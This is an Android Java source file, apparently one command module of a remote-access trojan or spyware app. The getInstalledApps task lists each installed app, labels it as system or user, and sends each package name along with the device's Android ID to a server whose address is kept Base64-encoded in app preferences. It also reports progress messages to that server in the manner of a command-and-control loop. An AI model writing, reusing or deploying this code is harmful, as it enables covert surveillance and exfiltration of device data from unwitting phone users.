package com.asynctask;

import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.preference.PreferenceManager;
import android.util.Base64;

import com.connect.MyApplication;
import com.utils.CommonUtils;

import java.io.UnsupportedEncodingException;
import java.util.List;

/**
 * Created by Conan0xff on 2017/12/3.
 */

public class getInstalledApps extends AsyncTask<String, Void, String> {
    String j = "";

    public getInstalledApps(String j) {
        this.j = j;
    }

    @Override
    protected String doInBackground(String... params) {
        final PackageManager packageManager = MyApplication.getContext().getPackageManager();
        List<ApplicationInfo> installedApplications = packageManager.getInstalledApplications(PackageManager.GET_META_DATA);
        int i = 0;
        for (ApplicationInfo appInfo : installedApplications) {
            if (i < Integer.parseInt(j)) {
                if ((appInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0) {
                    try {
                        String URL = new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("URL", ""), Base64.DEFAULT));
                        CommonUtils.getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("AndroidID", "") + "&Data=", "[SystemApp] " + appInfo.packageName);
                    } catch (UnsupportedEncodingException e) {

                        e.printStackTrace();
                    }
                } else {
                    try {
                        String URL = new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("URL", ""), Base64.DEFAULT));
                        CommonUtils.getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("AndroidID", "") + "&Data=", "[UserApp] " + appInfo.packageName);
                    } catch (UnsupportedEncodingException e) {

                        e.printStackTrace();
                    }
                }
            }
            i++;
        }

        return "Executed";
    }

    @Override
    protected void onPostExecute(String result) {
        PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).edit().putBoolean("Get", false).commit();
        try {
            String URL = new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("URL", ""), Base64.DEFAULT));
            CommonUtils.getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("AndroidID", "") + "&Data=", "Installed Apps Complete");
        } catch (UnsupportedEncodingException e) {

            e.printStackTrace();
        }
    }

    @Override
    protected void onPreExecute() {
        while (PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getBoolean("Get", false) == true) {
            try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
        try {
            String URL = new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("URL", ""), Base64.DEFAULT));
            CommonUtils.getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("AndroidID", "") + "&Data=", "Getting Installed Apps");
        } catch (UnsupportedEncodingException e) {

            e.printStackTrace();
        }
        PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).edit().putBoolean("Get", true).commit();
    }

    @Override
    protected void onProgressUpdate(Void... values) {
    }
}
